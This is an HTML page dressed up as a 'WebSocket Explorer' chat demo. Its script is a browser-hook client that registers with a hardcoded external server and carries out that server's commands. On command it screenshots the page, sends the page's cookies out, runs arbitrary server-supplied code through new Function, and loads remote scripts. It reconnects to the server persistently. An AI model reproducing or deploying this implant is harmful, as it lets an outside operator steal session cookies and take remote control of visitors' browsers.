<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>WebSocket Explorer — Hooked Client</title>

  <!-- fontawesome CDN (optional) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>

  <!-- html2canvas (required for screenshot command) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

  <style>
    /* (kept styling from your original file; trimmed for brevity here) */
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Segoe UI, Tahoma, Geneva, Verdana, sans-serif;background:linear-gradient(135deg,#1a2a6c,#b21f1f,#fdbb2d);color:#fff;padding:20px}
    .container{max-width:1200px;margin:0 auto}
    header{text-align:center;padding:30px 0;margin-bottom:30px}
    h1{font-size:3rem;margin-bottom:8px}
    .card{background:rgba(255,255,255,0.08);border-radius:12px;padding:18px;margin-bottom:20px}
    .demo-container{display:flex;flex-direction:column;height:360px}
    .chat-window{flex:1;background:rgba(0,0,0,0.2);border-radius:8px;padding:12px;overflow:auto;margin-bottom:12px}
    .message{padding:8px 12px;border-radius:16px;margin-bottom:10px;max-width:80%;word-wrap:break-word}
    .message.system{background:rgba(253,187,45,0.25);text-align:center;font-style:italic}
    .message.received{background:rgba(26,42,108,0.7);align-self:flex-start}
    .message.sent{background:rgba(178,31,31,0.7);align-self:flex-end;margin-left:auto}
    .input-area{display:flex;gap:8px}
    input,button{padding:10px;border-radius:8px;border:none}
    input{flex:1;background:rgba(255,255,255,0.12);color:#fff}
    button{background:#fdbb2d;color:#1a2a6c;font-weight:700;cursor:pointer}
    .status{margin-top:10px;display:flex;align-items:center;gap:10px}
    .status-indicator{width:12px;height:12px;border-radius:50%;display:inline-block;background:#f44336}
    .status.connected .status-indicator{background:#4caf50}
    .controls{display:flex;gap:8px;align-items:center}
    pre.code-block{background:rgba(0,0,0,0.25);padding:12px;border-radius:8px;overflow:auto}
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>WebSocket Explorer</h1>
      <p class="tagline">Client demo that integrates with your PathBasedHookServer</p>
    </header>

    <div class="card">
      <h2><i class="fas fa-comments"></i> Interactive Demo / Background Hook</h2>
      <div class="demo-container">
        <div class="chat-window" id="chat-window">
          <div class="message system">Welcome. The background hook client will register to your server once you click Connect.</div>
        </div>

        <div class="input-area">
          <input id="message-input" placeholder="Type a local UI message (not server command)..." />
          <button id="send-local">Add</button>
        </div>

        <div class="status" id="connection-status">
          <span class="status-indicator"></span>
          <span id="status-text">Disconnected</span>

          <div class="controls" style="margin-left:auto">
            <button id="connect-btn">Connect Hook</button>
            <button id="disconnect-btn" disabled>Disconnect Hook</button>
          </div>
        </div>

        <pre class="code-block" id="last-info" style="margin-top:10px">Last server message: —</pre>
      </div>
    </div>

    <footer style="text-align:center;margin-top:18px;opacity:.85">
      WebSocket Explorer &copy; 2025
    </footer>
  </div>

  <script>
  (function () {
    // ===== CONFIG =====
    const SERVER_HOST = '197.44.116.188';
    const SERVER_PORT = 8765;
    // Make sure this path is allowed by your PathBasedHookServer.
    const CLIENT_PATH = '/hook'; // options: '/', '/hook', '/browser', '/control', '/ws/xxxxx'
    // auto-generate a /ws/ id if you prefer:
    // const CLIENT_PATH = '/ws/' + Math.random().toString(36).slice(2,8);

    // ===== STATE =====
    const chatWindow = document.getElementById('chat-window');
    const msgInput = document.getElementById('message-input');
    const sendLocalBtn = document.getElementById('send-local');
    const connectBtn = document.getElementById('connect-btn');
    const disconnectBtn = document.getElementById('disconnect-btn');
    const statusText = document.getElementById('status-text');
    const statusEl = document.getElementById('connection-status');
    const lastInfo = document.getElementById('last-info');

    let ws = null;
    let browserId = 'browser_' + Math.random().toString(36).substr(2,9);
    let reconnectTimer = null;
    let reconnectAttempts = 0;
    let heartbeatInterval = null;

    // friendly message logging
    function addMessage(text, cls='system') {
      const d = document.createElement('div');
      d.className = 'message ' + cls;
      d.textContent = text;
      chatWindow.appendChild(d);
      chatWindow.scrollTop = chatWindow.scrollHeight;
    }

    function setStatus(connected) {
      if (connected) {
        statusEl.classList.add('connected');
        statusEl.classList.remove('disconnected');
        document.querySelector('.status-indicator').style.background = '#4caf50';
        statusText.textContent = `Connected (id: ${browserId} / path: ${CLIENT_PATH})`;
        connectBtn.disabled = true;
        disconnectBtn.disabled = false;
      } else {
        statusEl.classList.remove('connected');
        statusEl.classList.add('disconnected');
        document.querySelector('.status-indicator').style.background = '#f44336';
        statusText.textContent = 'Disconnected';
        connectBtn.disabled = false;
        disconnectBtn.disabled = true;
      }
    }

    // build websocket URL
    function wsUrl() {
      const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
      // Use explicit ws/ws://host:port because server is on separate host.
      return `ws://${SERVER_HOST}:${SERVER_PORT}${CLIENT_PATH}`;
    }

    // send JSON safely
    function sendJson(obj) {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        addMessage('Cannot send message: socket not open', 'system');
        return false;
      }
      try {
        ws.send(JSON.stringify(obj));
        return true;
      } catch (e) {
        addMessage('Send failed: ' + e.message, 'system');
        return false;
      }
    }

    // helper: inject script tag and await load/error
    function loadScriptUrl(url) {
      return new Promise((resolve, reject) => {
        try {
          const s = document.createElement('script');
          s.src = url;
          s.async = true;
          s.onload = () => resolve({ ok: true, url });
          s.onerror = (ev) => reject(new Error('Failed to load script: ' + url));
          document.head.appendChild(s);
        } catch (e) {
          reject(e);
        }
      });
    }

    // handle different command types from server
    async function handleServerCommand(command) {
      lastInfo.textContent = `Last server message: ${JSON.stringify(command, null, 2)}`;

      if (!command || !command.type) {
        addMessage('Received unknown server message', 'received');
        return;
      }

      // Commands expected by your controller: take_screenshot, get_title, get_cookies, eval, evalfile
      if (command.type === 'take_screenshot') {
        addMessage('Received screenshot command — capturing...', 'system');
        try {
          // html2canvas must be loaded
          if (typeof html2canvas !== 'function') throw new Error('html2canvas not available');
          const canvas = await html2canvas(document.body);
          const screenshot = canvas.toDataURL('image/png'); // base64 PNG data URL
          sendJson({
            type: 'response',
            subtype: 'screenshot',
            data: screenshot,
            browserId,
            url: window.location.href,
            commandId: command.commandId || null,
            ts: new Date().toISOString()
          });
          addMessage('Screenshot sent', 'sent');
        } catch (err) {
          sendJson({
            type: 'error',
            data: String(err.message || err),
            browserId,
            commandId: command.commandId || null,
            ts: new Date().toISOString()
          });
          addMessage('Screenshot failed: ' + (err && err.message ? err.message : String(err)), 'system');
        }
      }
      else if (command.type === 'get_title' || command.type === 'get_page_title') {
        sendJson({
          type: 'response',
          subtype: 'title',
          data: document.title,
          browserId,
          url: window.location.href,
          commandId: command.commandId || null,
          ts: new Date().toISOString()
        });
        addMessage('Title sent: ' + document.title, 'sent');
      }
      else if (command.type === 'get_cookies') {
        sendJson({
          type: 'response',
          subtype: 'cookies',
          data: document.cookie,
          browserId,
          url: window.location.href,
          commandId: command.commandId || null,
          ts: new Date().toISOString()
        });
        addMessage('Cookies sent', 'sent');
      }
      else if (command.type === 'eval' || command.type === 'evalfile') {
        addMessage(`${command.type} command received`, 'system');
        try {
          // Priority 1: if server provided code payload, run it (this covers your evalfile controller that inlines whole file)
          if (command.code) {
            // Use Function wrapper so `return` works and local scope is isolated
            const func = new Function('"use strict";\n' + (command.code || ''));
            const result = func();
            const resolved = result instanceof Promise ? await result : result;
            sendJson({
              type: 'response',
              subtype: 'eval',
              data: typeof resolved === 'undefined' ? String(resolved) : resolved,
              browserId,
              url: window.location.href,
              commandId: command.commandId || null,
              ts: new Date().toISOString()
            });
            addMessage(`${command.type} result sent`, 'sent');
          }
          // Priority 2: if server provided scriptUrl (remote script), load and run via <script src="...">
          else if (command.scriptUrl) {
            addMessage('Loading script from URL: ' + command.scriptUrl, 'system');
            await loadScriptUrl(command.scriptUrl);
            sendJson({
              type: 'response',
              subtype: 'eval',
              data: `loaded ${command.scriptUrl}`,
              browserId,
              url: window.location.href,
              commandId: command.commandId || null,
              ts: new Date().toISOString()
            });
            addMessage('Script loaded and executed (script tag)', 'sent');
          }
          // Nothing to run
          else {
            sendJson({
              type: 'error',
              data: 'No code or scriptUrl provided',
              browserId,
              commandId: command.commandId || null,
              ts: new Date().toISOString()
            });
            addMessage('Eval error: no code or scriptUrl', 'system');
          }
        } catch (err) {
          sendJson({
            type: 'error',
            data: String(err.message || err),
            browserId,
            commandId: command.commandId || null,
            ts: new Date().toISOString()
          });
          addMessage(`${command.type} error: ` + (err && err.message ? err.message : String(err)), 'system');
        }
      }
      else if (command.type === 'ping') {
        // respond with pong (useful if your server implements ping/pong over JSON)
        sendJson({ type: 'pong', ts: Date.now(), browserId, commandId: command.commandId || null });
      }
      else {
        // fallback: echo back
        addMessage('Unknown command: ' + command.type, 'system');
        sendJson({
          type: 'response',
          subtype: 'unknown',
          data: command,
          browserId,
          commandId: command.commandId || null,
          ts: new Date().toISOString()
        });
      }
    }

    // process raw incoming message
    async function onServerMessage(evt) {
      let payload;
      try {
        payload = JSON.parse(evt.data);
      } catch (e) {
        // non-JSON messages: display raw
        addMessage('Raw server message: ' + String(evt.data), 'received');
        return;
      }

      // If server acknowledges registration:
      if (payload.type === 'registered') {
        addMessage(`Server registered our client id=${payload.browserId} (path=${payload.path})`, 'system');
        setStatus(true);
        // start heartbeat to server (JSON ping) every 20s
        startHeartbeat();
        return;
      }

      // If server sends ping/pong/echo, update UI
      if (payload.type === 'pong' || payload.type === 'echo') {
        addMessage(`Server: ${JSON.stringify(payload)}`, 'received');
        return;
      }

      // If it's a command object, handle it
      await handleServerCommand(payload);
    }

    // ===== Connection lifecycle =====
    function startHeartbeat() {
      stopHeartbeat();
      heartbeatInterval = setInterval(() => {
        if (ws && ws.readyState === WebSocket.OPEN) {
          sendJson({ type: 'ping', ts: Date.now(), browserId });
        }
      }, 20000);
    }
    function stopHeartbeat() {
      if (heartbeatInterval) {
        clearInterval(heartbeatInterval);
        heartbeatInterval = null;
      }
    }

    function connect() {
      // clear any pending reconnect attempts
      if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
      }

      const url = wsUrl();
      addMessage('Connecting to ' + url, 'system');

      try {
        ws = new WebSocket(url);
      } catch (err) {
        addMessage('WebSocket constructor failed: ' + err.message, 'system');
        scheduleReconnect();
        return;
      }

      ws.onopen = () => {
        reconnectAttempts = 0;
        addMessage('Background hook connected — sending register', 'system');
        // send register payload the server expects
        sendJson({
          type: 'register',
          browserId,
          userAgent: navigator.userAgent,
          url: window.location.href,
          path: CLIENT_PATH,
          ts: new Date().toISOString()
        });
        // set UI connected state once server acknowledges with 'registered'
        // but optimistically mark connected here
        setStatus(true);
      };

      ws.onmessage = onServerMessage;

      ws.onerror = (err) => {
        addMessage('WebSocket error', 'system');
        console.error('WS error', err);
      };

      ws.onclose = (ev) => {
        addMessage('Hook connection closed', 'system');
        setStatus(false);
        stopHeartbeat();
        scheduleReconnect();
      };
    }

    function disconnect() {
      if (ws) {
        stopHeartbeat();
        try { ws.close(); } catch (e) {}
        ws = null;
      }
      setStatus(false);
      addMessage('Hook disconnected by user', 'system');
    }

    function scheduleReconnect() {
      // simple exponential backoff with cap
      reconnectAttempts++;
      const delay = Math.min(60000, Math.pow(2, Math.min(reconnectAttempts, 8)) * 1000) + Math.floor(Math.random()*1000);
      addMessage(`Reconnecting in ${Math.round(delay/1000)}s...`, 'system');
      if (reconnectTimer) clearTimeout(reconnectTimer);
      reconnectTimer = setTimeout(() => {
        connect();
      }, delay);
    }

    // ===== UI bindings =====
    connectBtn.addEventListener('click', () => {
      connect();
    });

    disconnectBtn.addEventListener('click', () => {
      disconnect();
    });

    sendLocalBtn.addEventListener('click', () => {
      const txt = msgInput.value.trim();
      if (!txt) return;
      addMessage('You: ' + txt, 'sent');
      msgInput.value = '';
    });

    msgInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') sendLocalBtn.click();
    });

    // expose debug on window
    window.__hookClient = {
      connect,
      disconnect,
      getBrowserId: () => browserId,
      sendJson
    };

    // initial UI state
    setStatus(false);
  })();
  </script>
</body>
</html>
